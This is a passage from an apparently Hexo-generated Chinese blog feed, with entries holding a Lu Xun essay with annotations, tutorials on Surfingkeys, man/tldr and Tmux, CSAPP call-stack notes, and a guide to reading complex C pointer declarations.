href="https://www.jianshu.com/p/e154c2ef002f">location url 匹配教程</a></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>web服务器</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>鲁迅《热风》 四十一〔１〕</title>
    <link href="/p/6068f6cf/"/>
    <url>/p/6068f6cf/</url>
    
    <content type="html"><![CDATA[<h1 id="鲁迅《热风》-四十一〔１〕"><a href="#鲁迅《热风》-四十一〔１〕" class="headerlink" title="鲁迅《热风》 四十一〔１〕"></a>鲁迅《热风》 四十一〔１〕</h1><p>从一封匿名信里看见一句话，是“数麻石片”（原注江苏方言），大约是没有本领便不必提倡改革，不如去数石片的好的意思。因此又记起了本志通信栏内所载四川方言的“洗煤炭”〔２〕。想来别省方言中，相类的话还多；守着这专劝人自暴自弃的格言的人，也怕并<br>不少。</p><p>凡中国人说一句话，做一件事，倘与传来的积习有若干抵触，须一个斤斗便告成功，才有立足的处所；而且被恭维得烙铁一般热。否则免不了标新立异的罪名，不许说话；或者竟成了大逆不道，为天地所不容。这一种人，从前本可以夷到九族〔３〕，连累邻居；现在却不过是几封匿名信罢了。但意志略略薄弱的人便不免因此萎缩，不知不觉的也入了“数麻石片”党。</p><p>所以现在的中国，社会上毫无改革，学术上没有发明，美术上也没有创作；至于多人继续的研究，前仆后继的探险，那更不必提了。国人的事业，大抵是专谋时式的成功的经营，以及对于一切的冷笑。</p><p>但冷笑的人，虽然反对改革，却又未必有保守的能力：即如文字一面，白话固然看不上眼，古文也不甚提得起笔。照他的学说，本该去“数麻石片”了；他却又不然，只是莫名其妙的冷笑。</p><p>中国的人，大抵在如此空气里成功，在如此空气里萎缩腐败，以至老死。</p><p>我想，人猿同源的学说，大约可以毫无疑义了。但我不懂，何以从前的古猴子，不都努力变人，却到现在还留着子孙，变把戏给人看。还是那时竟没有一匹想站起来学说人话呢？还是虽然有了几匹，却终被猴子社会攻击他标新立异，都咬死了；所以终于不能进化呢？</p><p>尼采〔４〕式的超人，虽然太觉渺茫，但就世界现有人种的事实看来，却可以确信将来总有尤为高尚尤近圆满的人类出现。到那时候，类人猿上面，怕要添出“类猿人”这一个名词。</p><p>所以我时常害怕，愿中国青年都摆脱冷气，只是向上走，不必听自暴自弃者流的话。能做事的做事，能发声的发声。有一分热，发一分光，就令萤火一般，也可以在黑暗里发一点光，不必等候炬火。</p><p>此后如竟没有炬火：我便是唯一的光。倘若有了炬火，出了太阳，我们自然心悦诚服的消失，不但毫无不平，而且还要随喜〔５〕赞美这炬火或太阳；因为他照了人类，连我都在内。</p><p>我又愿中国青年都只是向上走，不必理会这冷笑和暗箭。</p><p>尼采说：</p><blockquote><p>“真的，人是一个浊流。应该是海了，能容这浊流使他干净。<br>“咄，我教你们超人：这便是海，在他这里，能容下你们的大侮蔑。”<br>（《札拉图如是说》的《序言》第三节）</p></blockquote><p>纵令不过一洼浅水，也可以学学大海；横竖都是水，可以相通。几粒石子，任他们暗地里掷来；几滴秽水，任他们从背后泼来就是了。这还算不到“大侮蔑”——因为大侮蔑也须有胆力。</p><p>〔１〕　本篇最初发表于一九一九年一月十五日《新青年》第六卷第一号，署名唐俟。<br>〔２〕　“洗煤炭”　见《新青年》第五卷第二号（一九一八年八月十五日）《通信》栏载任鸿隽给胡适的信：“《新青年》一面讲改良文学，一面讲废灭汉文，是否自相矛盾？既要废灭不用，又用力去改良不用的物件。我们四川有句俗语说：“你要没有事做，不如洗煤炭去罢。”<br>〔３〕　九族　指自身及自身以上的父、祖、曾祖、高祖和以下的子、孙、曾孙、玄孙。另一种说法是以父族四代、母族三代、妻族二代为九族。<br>〔４〕　尼采（Ｆ．Ｎｉｅｔｚｓｃｈｅ）　参看本卷第５９页注〔２６〕。下文所说的《札拉图如是说》，即《札拉图斯特拉如是说》，是他的一部主要哲学著作。<br>〔５〕　随喜　佛家语，《修忏要旨》说：“随他修善，喜他得成。”意思是随着别人做善事，为别人获得善果而高兴。</p>]]></content>
    
    
    <categories>
      
      <category>文摘</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Surfingkeys：网页的Vim拓展</title>
    <link href="/p/408033bf/"/>
    <url>/p/408033bf/</url>
    
    <content type="html"><![CDATA[<h1 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h1><p>在这里整个浏览器Vim插件的花活，先讲几个实用情景：</p><ul><li><code>s+g</code>可以直接使用谷歌搜索粘贴板的内容</li><li><code>o+s</code>呼出Stack Overflow的搜索栏，直接指定Stack Overflow网站搜索内容</li><li><code>o+x</code>显示最近关闭的所有页面</li><li><code>.</code>重复上一次操作</li><li><code>G</code>滚到网页末尾</li><li><code>O</code>圈中范围内所有的链接，按下键盘字母直接跳转</li><li><code>t</code>显示所有已经打开的页面，并通过tab键进行跳转（也可以直接使用默认搜索引擎搜索内容）</li><li>进入visual模式仅用键盘完成一个单词\句子\行\段落的复制</li><li><code>ge</code>打开Chrome拓展页面</li><li><code>yy</code>直接复制当前页面的地址</li></ul><p>担心命令太多记不住？没关系，按下？直接打开帮助</p><h1 id="什么是Surfingkeys"><a href="#什么是Surfingkeys" class="headerlink" title="什么是Surfingkeys"></a>什么是Surfingkeys</h1><p>Surfingkeys 是一个Chrome/火狐浏览器的扩展，安装之后可以通过类似vim的操作来控制浏览器，比如<code>hjkl</code>来进行上下左右的移动，<code>e</code>  <code>d</code>来完成网页的翻页，<code>gg</code>、<code>G</code>实现网页首位的快速跳转</p><p>每个按键/按键组合都对应着不同的操作，记住这些快捷键可以方便的摆脱鼠标，增加生产力</p><p>按下<code>?</code>可以快速打开它的帮助文档，按下<code>;e</code>可以更改每个按键对应的功能（如下图所示）</p><p><img src="https://img-blog.csdnimg.cn/e1a6af70f8b3489e8b50920d5202a935.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="帮助菜单"></p><p><img src="https://img-blog.csdnimg.cn/00ab59eb88b24fa58fd5d87157e3e405.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="键位映射设置，单机可更改"></p><p>但是，需求是因人而异的。为求同存异，笔者下面会在一定情境下举例说明Surfingkeys的使用方法</p><h1 id="按-f-键进入坦克"><a href="#按-f-键进入坦克" class="headerlink" title="按 f 键进入坦克"></a>按 f 键进入坦克</h1><p>f 是一个很强大的按键，按下之后，在页面的超链接都会显示黄色的标签，只要按下对应的字母，就可以进行跳转，从而解放双手</p><p><img src="https://img-blog.csdnimg.cn/50285be91253419aaeb0040fddb5fbea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="查找"><a href="#查找" class="headerlink" title="查找"></a>查找</h1><p>按下<code>/</code>按键输入文本，那么匹配的文本会高亮显示</p><p>按下<code>n</code>，则光标滑动到下一个位置，  <code>N</code>滑到上一个位置</p><h1 id="搜索"><a href="#搜索" class="headerlink" title="搜索"></a>搜索</h1><p>普通模式下，按下<code>og</code> 打开谷歌搜索，tab键可以切换搜索内容</p><p><img src="https://img-blog.csdnimg.cn/5de52c55af654169a892ab50650971e9.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_16,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="复制"><a href="#复制" class="headerlink" title="复制"></a>复制</h1><p>y在Vim中是复制按键，在Surfingkeys中也不例外</p><p><strong>普通模式下按下y</strong><br><img src="https://img-blog.csdnimg.cn/a09bd9ff51b64a61b0f3bec2fbe8ab10.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_19,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p><strong>可视化模式按下y</strong></p><p>按下<code>V</code>进入可视化模式。按下y之后可以接下面按键：</p><ul><li>复制一个单词(w)</li><li>行(I)</li><li>句子(s)</li><li>段落(p)</li></ul><h1 id="书签"><a href="#书签" class="headerlink" title="书签"></a>书签</h1><p>按下<code>ab</code>可以把当前页面加入书签<br><img src="https://img-blog.csdnimg.cn/8c34f253e3cf4626afbb072a5b87b942.png" alt="在这里插入图片描述"></p><h1 id="切换标签页"><a href="#切换标签页" class="headerlink" title="切换标签页"></a>切换标签页</h1><p><code>E</code> 和 <code>R</code>分别对应切换到前/后标签页</p><h1 id="PDF"><a href="#PDF" class="headerlink" title="PDF"></a>PDF</h1><p>很多Vim插件不支持对PDF的操作，但是Surfingkeys可以</p><p>在启用了Surfingkeys之后，默认以Surfingkeys打开PDF，如果想要关闭，按下<code>;s</code>即可</p><h1 id="links"><a href="#links" class="headerlink" title="links"></a>links</h1><p><a href="https://github.com/brookhong/Surfingkeys">GitHub地址</a></p>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
    <tags>
      
      <tag>vim</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux手册指南</title>
    <link href="/p/50b51ea9/"/>
    <url>/p/50b51ea9/</url>
    
    <content type="html"><![CDATA[<h1 id="man手册"><a href="#man手册" class="headerlink" title="man手册"></a>man手册</h1><p>man 手册提供了极佳的快速查询功能，当我们不熟悉某个指令的时候，可以通过在命令行输入 man + command 查询在线手册</p><ul><li>section类别<ul><li>由数字标识，具体如下：<blockquote><p>1：可执行的程式或是shell 指令。<br>2：系统呼叫（system calls，Linux 核心所提供的函数）。<br>3：一般函式库函数。<br>4：特殊档案（通常位于/dev）。<br>5：档案格式与协定，如 /etc/passwd<br>6：游戏。<br>7：杂项（巨集等，如man(7)、groff(7)）。<br>8：系统管理者指令（通常是管理者 root 专用的）。<br>9：Kernel routines（非标准）。</p></blockquote></li><li><code>man num command</code> 指定查看num标识的命令</li><li><code>man -aw command</code>查看命令有几个section列表</li></ul></li><li><code>man -k command</code>可以帮助我们线上搜索所有相关内容，并且附带对应的简要说明</li><li><a href="https://github.com/man-pages-zh/manpages-zh">man手册中文翻译版</a></li></ul><h1 id="tldr"><a href="#tldr" class="headerlink" title="tldr"></a>tldr</h1><p>对于某些命令，man 的内容实在太多，比如，我们输入 <code>man gcc | wc -l</code>来统计gcc的man手册行数，结果有19991行，这太多了，因此我们需要一个精简版的man指令，它就是tldr</p><p><code>tldr</code> 是<code>&quot;too long; didn’tread&quot;</code>的缩写，旨在显示简单版的命令文档，并提供常用命令示例，它是github上一个<a href="https://github.com/ostera/tldr.jsx">开源项目</a></p><p>一键安装：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g tldr<br></code></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/0328645b122549cba76c1163e53e0dd7.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><p>当我们输入<code>tldr curl</code>，得到如下输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> tldr curl</span><br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"> curl</span><br>  Transfers data from or to a server.<br>  Supports most protocols, including HTTP, FTP, and POP3.<br>  More information: &lt;https://curl.haxx.se&gt;.<br><br>- Download the contents of an URL to a file:<br><br>  curl http://example.com -o filename<br><br>- Download a file, saving the output under the filename indicated by the URL:<br><br>  curl -O http://example.com/filename<br><br>- Download a file, following [L]ocation redirects, and automatically [C]ontinuing (resuming) a previous file transfer:<br><br>  curl -O -L -C - http://example.com/filename<br><br>- Send form-encoded data (POST request of type `application/x-www-form-urlencoded`):<br><br>  curl -d &#x27;name=bob&#x27; http://example.com/form                                                                                            <br>- Send a request with an extra header, using a custom HTTP method:<br><br>  curl -H &#x27;X-My-Header: 123&#x27; -X PUT http://example.com                                                                                  <br>- Send data in JSON format, specifying the appropriate content-type header:<br><br>  curl -d &#x27;&#123;&quot;name&quot;:&quot;bob&quot;&#125;&#x27; -H &#x27;Content-Type: application/json&#x27; http://example.com/users/1234<br></code></pre></td></tr></table></figure><p>同时，该项目还提供了网页版：<a href="tldr.ostera.io">tldr.ostera.io</a> 在线查询</p><p><img src="https://img-blog.csdnimg.cn/249d67a6834d412ab04c04a61ce1716d.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBA6YOt5ZCM5a2m5aaC5piv6K-0,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h1 id="Linux上一些其它参考"><a href="#Linux上一些其它参考" class="headerlink" title="Linux上一些其它参考"></a>Linux上一些其它参考</h1><ul><li><code>help</code>、<code>info</code>命令</li><li><a href="https://wizardforcel.gitbooks.io/linux-c-api-ref/content/">Linux参考手册</a><ul><li>一个中文版本的Linux函数解释</li></ul></li><li><a href="https://cplusplus.com/">https://cplusplus.com/</a></li><li>apue</li><li>uulp</li></ul>]]></content>
    
    
    <categories>
      
      <category>工具使用</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>计算机教育中缺失的一课——Tmux</title>
    <link href="/p/34c553/"/>
    <url>/p/34c553/</url>
    
    <content type="html"><![CDATA[<h1 id="Tmux简介——优雅永不过时"><a href="#Tmux简介——优雅永不过时" class="headerlink" title="Tmux简介——优雅永不过时"></a>Tmux简介——优雅永不过时</h1><p>Tmux是个非常强大的终端工具，不仅可以提供终端的多路复用，同时可以将会话（session）与窗口分离，大幅提升生产力</p><p><img src="/image/tmux-tutorial/tmux-1.png"></p><p>在终端写命令的时候，经常碰到这几种状况</p><ul><li>需要多个终端命令行同时共同工作，但是：<ul><li>根本没有自带分屏（比如Ubuntu），只能多开几个terminal</li><li>终端窗口自带的分屏非常难用，即是是软粉吹上天的新版Windows terminal，分屏也非常拉胯</li></ul></li><li>需要ssh远程连接服务器，但是若丢失了与远程系统的连接（比如突然断网或者卡死），那么一切服务都会被关闭<ul><li>究其原因，在于终端窗口与会话没有完成分离，关闭了窗口，也就关闭了与远程的会话</li></ul></li></ul><p>Tmux的出现改变了这种现状</p><h1 id="session、window、pane"><a href="#session、window、pane" class="headerlink" title="session、window、pane"></a>session、window、pane</h1><p>session、window、pane分别对应中文的会话、窗口、面板，一个session可以有多个Window，一个Windows可以有多个pane</p><p>当在终端输入Tmux之后，就进入了一个session，默认为0，也可<code>Tmux new -s name</code>为新创建的session指定名称</p><p><img src="/image/tmux-tutorial/image-20220104005009336.png" alt="ctrl-b + s得到目前session信息"></p><p>上图是我所运行的Tmux样例，可以通过输入指令<code>ctrl-b + s</code>得到。下面我们分析该图，从而搞懂session、window、pane三者之间的关系</p><ul><li>最左边（0）~（8）是行号</li><li>行号右边有0和1，指的是编号为0和1的两个session</li><li>第一个session有一个Window，第二个session有两个window，且第二个window有两个pane，分别是fish的shell和bash的shell</li></ul><h1 id="神奇的ctrl-d按键"><a href="#神奇的ctrl-d按键" class="headerlink" title="神奇的ctrl-d按键"></a>神奇的ctrl-d按键</h1><p>请注意，几乎所有Tmux的命令都要配合ctrl-d使用。比如显示所有的Tmux session，需要输入指令<code>ctrl-b + s</code>，这意味着，你需要先同时按住ctrl 和 b，然后松开，之后按住 s。</p><h1 id="如何分屏"><a href="#如何分屏" class="headerlink" title="如何分屏"></a>如何分屏</h1><p>分屏是Tmux的核心。输入Tmux之后，你就进入了该session对应的window，且该Window有一个pane</p><ul><li><p>创建新Window：<code>ctrl-b + c</code>：在当前session中创建一个新的window</p></li><li><p>左右分屏创建新pane：<code>ctrl-b + %</code></p></li><li><p>上下分屏创建新pane：<code>ctrl-b + &quot;</code></p></li></ul><h1 id="如何切换session、window、pane"><a href="#如何切换session、window、pane" class="headerlink" title="如何切换session、window、pane"></a>如何切换session、window、pane</h1><p>参考图<code>ctrl-b + s得到目前session信息</code></p><ul><li>在按下<code>ctrl-b + s</code> 或者 <code>ctrl-b + w</code>后，会显示所有的会话、窗口、面板信息</li><li>此时，可以通过上下左右箭头并且敲击回车的方式切换不同的session、window、pane</li><li>在同一个window下，切换pane的方法：<ul><li>按下<code>ctrl-b</code>，松开，快速按下<code>上下左右键</code>，可以实现pane的切换</li><li>按下<code>ctrl-b</code>，松开b，不松开ctrl，同时按下<code>上下左右键</code>，可以控制pane的大小</li></ul></li></ul><h1 id="如何实现会话与窗口的分离"><a href="#如何实现会话与窗口的分离" class="headerlink" title="如何实现会话与窗口的分离"></a>如何实现会话与窗口的分离</h1><p>使用普通终端的痛点在于，终端窗口与会话没有完成分离，关闭了窗口，也就关闭了与远程的会话，实现会话与窗口的分离，是Tmux的杀手功能</p><p>按下<code>Ctrl+b d</code>或者输入<code>Tmux detach</code>命令，就会将当前session与窗口分离，分离之后，即使关闭了当前窗口，会话中的进程依然会继续进行</p><p>当下次想要继续使用的时候，可以通过输入命令<code>Tmux attach-session -t session_name</code>来继续会话</p><p>挂起操作：<code>ctrl+b ctrl+z</code>(ctlr键按住不动，先按住b，松开后再按住z)</p><h1 id="自定义你的Tmux"><a href="#自定义你的Tmux" class="headerlink" title="自定义你的Tmux"></a>自定义你的Tmux</h1><p>Tmux具有丰富的插件支持，在github上有许多对应资源</p><p>//TODO </p>]]></content>
    
    
    <categories>
      
      <category>计算机教育中缺失的一课</category>
      
    </categories>
    
    
    <tags>
      
      <tag>linux</tag>
      
      <tag>Tmux</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CSAPP：程序的机器级表示-4</title>
    <link href="/p/3754ea8a/"/>
    <url>/p/3754ea8a/</url>
    
    <content type="html"><![CDATA[<h1 id="函数调用栈"><a href="#函数调用栈" class="headerlink" title="函数调用栈"></a>函数调用栈</h1><h2 id="栈的布局"><a href="#栈的布局" class="headerlink" title="栈的布局"></a>栈的布局</h2><ul><li>由高地址向低地址增长</li><li>栈帧结构的两端由两个指针来指定<ul><li>栈指针：%rsp，指向栈顶，地址更高</li><li>桢指针：%rbp，指向栈底，地址更低</li></ul></li></ul><h2 id="出栈入栈"><a href="#出栈入栈" class="headerlink" title="出栈入栈"></a>出栈入栈</h2><ul><li>pushq Src<ul><li>从Src取操作数</li><li>将%rsp减8</li><li>将操作数写到%rsp指向的地址</li></ul></li><li>popq Dst<ul><li>从%rsp中保存的地址值读取数值</li><li>将 %rsp加 8</li><li>将数值保存到Dst (必须是寄存器)</li></ul></li></ul><h1 id="过程控制"><a href="#过程控制" class="headerlink" title="过程控制"></a>过程控制</h1><ul><li>A函数调用B函数<ul><li>A是调用过程</li><li>B是被调用过程</li></ul></li><li>返回地址入栈<ul><li>返回地址（return address）是紧随call指令的下一条指令的地址</li></ul></li><li>过程返回ret<ul><li>从栈中弹出返回地址</li><li>跳转到返回地址</li></ul></li><li>要注意理解%rsp、%rip的变化</li></ul><h1 id="需要保存的几个状态"><a href="#需要保存的几个状态" class="headerlink" title="需要保存的几个状态"></a>需要保存的几个状态</h1><p>栈分配单位——帧，栈中单个过程实例的状态数据</p><ul><li>参数</li><li>局部变量</li><li>返回地址</li></ul><hr><ul><li>call对应push操作（栈帧开辟）</li><li>ret对应pop操作（栈帧回收）</li></ul><p>这个地方还是要自己调试一遍程序，或者画一下过程图，分析一下地址和几个主要寄存器</p>]]></content>
    
    
    <categories>
      
      <category>CSAPP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>操作系统，csapp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>C语言：复杂指针声明</title>
    <link href="/p/279b9795/"/>
    <url>/p/279b9795/</url>
    
    <content type="html"><![CDATA[<p><img src="/image/cpro.png"></p><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>指针是一种保存变量地址的变量，简单指针容易分析，但是当指针稍微复杂，就很容易无从下手，比如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">char</span> *(*(**foo[][<span class="hljs-number">8</span>])())[]; <br></code></pre></td></tr></table></figure><h1 id="普通指针"><a href="#普通指针" class="headerlink" title="普通指针"></a>普通指针</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;cstdio&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-built_in">std</span>;<br><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">int</span> a = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">int</span> * pa = &amp;a;<br>    <span class="hljs-keyword">int</span> ** ppa = &amp;pa;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%p %d %p %p %d %p %p %d &quot;</span>, &amp;a, a, &amp;pa, pa, *pa, ppa, *ppa, **ppa);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span> <br><br><span class="hljs-number">0000004</span>d389ff9f8 <span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span> <br><br><span class="hljs-number">0000004</span>d389ff9f8 <span class="hljs-number">0000004</span>d389ffa04 <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><ul><li>pa是指向int类型的指针，它的值是变量a的地址</li><li>ppa是指向pa的指针（二维指针）</li><li>占位符 %p 对应指针变量的值</li><li>&amp;p指的是指针p在内存中的地址</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="运算符结合顺序"><a href="#运算符结合顺序" class="headerlink" title="运算符结合顺序"></a>运算符结合顺序</h2><ul><li><p>结合的优先级由大到小：<code>()</code> &gt; <code>[]</code> &gt; <code>*</code></p></li><li><p>著名的右左法则：先看最里面的括号，再看右边，再看左边。每当你遇到括号，你应该改变你的阅读方向。解析完括号内的所有内容后，跳出括号。重复此过程，直到解决整个语句。</p></li></ul><blockquote><p>Right-Left Rule: First look at the innermost parenthesis, then look to the right, and then to the left. Whenever you encounter parentheses, you should switch your reading direction. Once you have parsed everything inside the parentheses, jump out of the parentheses. Repeat this process until the entire statement is resolved. </p></blockquote><p>参考：<a href="https://blog.karatos.in/a?ID=00250-f7e0610c-459c-431a-a3ab-d9a50a7d5598">c pointer right and left rule</a></p><h2 id="函数指针"><a href="#函数指针" class="headerlink" title="函数指针"></a>函数指针</h2><p>函数指针是指向函数的指针变量</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">max</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x, <span class="hljs-keyword">int</span> y)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> x &gt; y ? x : y;<br>&#125;<br><br>---<br><br><span class="hljs-keyword">int</span> (* p)(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">int</span>) = &amp; max; <span class="hljs-comment">// &amp;可以省略</span><br></code></pre></td></tr></table></figure><ul><li>p是函数指针</li><li>参数为（int，int），返回值为int</li><li>此后p相当于max，p(a,b)相当于max(a,b)</li></ul><p>#复杂指针分析</p><h2 id="int-f"><a href="#int-f" class="headerlink" title="int* f();"></a>int* f();</h2><ul><li>由上述结合顺序得，f先和()结合</li><li>f 是一个函数 ，它的返回值是int* 类型，也即是指向int 类型的指针</li></ul><h2 id="int-f-1"><a href="#int-f-1" class="headerlink" title="int (* f)();"></a>int (* f)();</h2><ul><li>由于()的存在，f先和*结合，再和右侧的()结合</li><li>f是一个函数指针，它指向的函数的返回值是int类型</li><li>程序中的每个函数都位于内存中的某个位置，所以存在指向那个位置的指针</li></ul><h2 id="int-f-2"><a href="#int-f-2" class="headerlink" title="int* (* f)();"></a>int* (* f)();</h2><ul><li>f是一个函数指针</li><li>它指向的函数的返回值是指向int类型的指针</li></ul><h1 id="int-f-3"><a href="#int-f-3" class="headerlink" title="int *f[]"></a>int *f[]</h1><ul><li>f是一个数组，该数组每个元素都是指向int类型的指针</li></ul><h1 id="int-f-10"><a href="#int-f-10" class="headerlink" title="int (*f)[10]"></a>int (*f)[10]</h1><ul><li>f是一个指针</li><li>指向一个int类型的数组，该数组有十个int类型的值 </li></ul><h1 id="int-f-4"><a href="#int-f-4" class="headerlink" title="int ** f"></a>int ** f</h1><p>可以参考<a href="https://blog.csdn.net/weixin_43864567/article/details/122778185?spm=1001.2014.3001.5501">【C语言指针】char* argv[] 、char **argv、命令行传参</a></p><h1 id="int-f-5"><a href="#int-f-5" class="headerlink" title="int (*f[])();"></a>int (*f[])();</h1><ul><li> f是一个数组</li><li>数组元素的类型是函数指针</li><li>函数的返回值是一个整型值</li></ul><h1 id="int-f-6"><a href="#int-f-6" class="headerlink" title="int *(*f[])();"></a>int *(*f[])();</h1><ul><li> f是一个数组</li><li>数组元素的类型是函数指针</li><li>函数的返回值是指向 int 类型的指针</li></ul><h1 id="int-pfunc-int-5-int"><a href="#int-pfunc-int-5-int" class="headerlink" title="int (*(*(*pfunc)(int *))[5])(int *)"></a>int (*(*(*pfunc)(int *))[5])(int *)</h1><ul><li>pfunc是一个函数指针</li><li>函数的参数是指向int类型的指针</li><li>函数的返回值是一个指针，指向一个具有五个元素的数组，该数组的每一个元素都是一个指针</li><li>此指针指向一个函数，该函数的参数为int * ，返回类型为int</li></ul><h1 id="void-signal-int-sig-void-func-int-int"><a href="#void-signal-int-sig-void-func-int-int" class="headerlink" title="void (*signal(int sig, void (*func)(int)))(int);"></a><code>void (*signal(int sig, void (*func)(int)))(int);</code></h1><ul><li>简化声明<ul><li><code>void (*signal(int sig, func))(int);</code></li><li><code>void (*)(int);</code></li></ul></li><li>signal 是一个函数<ul><li>有两个参数，一个为int类型，一个为指向函数的指针</li><li>返回值为指向函数的指针（参数为int，返回值为void）<h1 id="cdecl-辅助分析"><a href="#cdecl-辅助分析" class="headerlink" title="cdecl 辅助分析"></a>cdecl 辅助分析</h1>通过包管理器安装cdecl程序<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">$ sudo apt install cdecl<br><br>$ cdecl<br><br>cdecl&gt; explain <span class="hljs-keyword">char</span> *(*(**foo[][<span class="hljs-number">8</span>])())[]<br><br>declare foo as <span class="hljs-built_in">array</span> of <span class="hljs-built_in">array</span> <span class="hljs-number">8</span> of pointer to pointer to function returning pointer to <span class="hljs-built_in">array</span> of pointer to <span class="hljs-keyword">char</span><br></code></pre></td></tr></table></figure></li></ul></li></ul>]]></content>
    
    
    <categories>
      
      <category>C语言</category>
      
    </categories>
    
    
    <tags>
      
      <tag>C语言，指针</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Tinyhttpd源码学习</title>
    <link href="/p/29256323/"/>
    <url>/p/29256323/</url>
    
